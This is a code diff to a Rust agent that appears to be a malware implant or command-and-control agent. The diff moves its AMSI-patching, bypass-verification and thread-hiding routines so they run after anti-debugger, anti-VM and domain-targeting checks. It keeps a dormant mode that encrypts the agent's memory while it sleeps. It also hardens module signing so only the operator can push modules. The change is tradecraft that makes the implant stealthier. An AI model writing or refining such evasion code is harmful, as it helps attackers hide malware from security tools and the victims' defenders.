@@ -80,11 +80,24 @@ impl Agent {
             key.copy_from_slice(&bytes);
             key
         } else {
+            // In release builds (no debug_assertions, not dev/test feature) a
+            // missing module_signing_key is a hard error: an all-zero key lets
+            // anyone push arbitrary modules.  Development builds accept the
+            // insecure default so the build cycle stays fast.
             #[cfg(not(any(debug_assertions, feature = "dev", test)))]
-            // compile_error removed
+            return Err(anyhow::anyhow!(
+                "module_signing_key is required in production builds. \
+                 Generate a 32-byte key with `keygen`, base64-encode it, \
+                 and set it in agent.toml under [module_signing_key]."
+            ));
 
-            log::warn!("WARNING: Using insecure default module key. Do not use in production!");
-            [0u8; 32] // insecure default; acceptable for development builds
+            #[cfg(any(debug_assertions, feature = "dev", test))]
+            log::warn!(
+                "WARNING: module_signing_key not set — using insecure all-zero key. \
+                 Do not use in production!"
+            );
+
+            [0u8; 32] // insecure default; acceptable only for development builds
         };
 
         Ok(Self {
@@ -95,17 +108,10 @@ impl Agent {
     }
 
     pub async fn run(&mut self) -> Result<()> {
-        // BYPASS SEQUENCE START
-        log::debug!("Applying evasion layers");
-        unsafe { crate::evasion::patch_amsi(); }
-        crate::amsi_defense::orchestrate_layers();
-        crate::amsi_defense::verify_bypass();
-        crate::evasion::hide_current_thread();
-        log::debug!("Evasion layers applied");
-        // BYPASS SEQUENCE END
-
-        // Trusted Execution Environment Enforcement (env_check.rs):
-        // refuse to start under a debugger or on the wrong domain.
+        // Trusted Execution Environment Enforcement runs FIRST, before any
+        // side-effectful hooks are applied.  If the environment is hostile
+        // (debugger, wrong domain, VM when refuse_in_vm is set) the agent
+        // enters a dormant state without having modified any process state.
         {
             let decision = {
                 let cfg = self.config.lock().await;
@@ -126,16 +132,10 @@ impl Agent {
                     decision.report.vm_detected,
                     decision.report.domain_match,
                 );
-                // Dormant state: periodically re-evaluate the environment so
-                // that transient conditions (e.g. a debugger attached briefly
-                // during IT maintenance) do not permanently disable the agent.
-                // After MAX_RETRIES failed re-checks the agent exits cleanly
-                // so the process supervisor can restart it.
-                const RECHECK_INTERVAL_SECS: u64 = 2 * 3600; // 2 hours
+                const RECHECK_INTERVAL_SECS: u64 = 2 * 3600;
                 const MAX_RETRIES: u32 = 3;
                 let mut retries = 0u32;
                 loop {
-                    // Guard sensitive memory while dormant; decrypts on wake.
                     if let Err(e) = crate::memory_guard::guarded_sleep(
                         std::time::Duration::from_secs(RECHECK_INTERVAL_SECS),
                         None,
@@ -174,6 +174,17 @@ impl Agent {
                 );
             }
         }
+
+        // Evasion layers are applied AFTER environment validation succeeds.
+        // Applying them before validation would produce side-effects (AMSI
+        // patches, thread hiding) even on hostile hosts where the agent should
+        // refuse to run.
+        log::debug!("Applying evasion layers");
+        unsafe { crate::evasion::patch_amsi(); }
+        crate::amsi_defense::orchestrate_layers();
+        crate::amsi_defense::verify_bypass();
+        crate::evasion::hide_current_thread();
+        log::debug!("Evasion layers applied");
 
         // Optimize hot functions at startup
         #[cfg(feature = "unsafe-runtime-rewrite")]
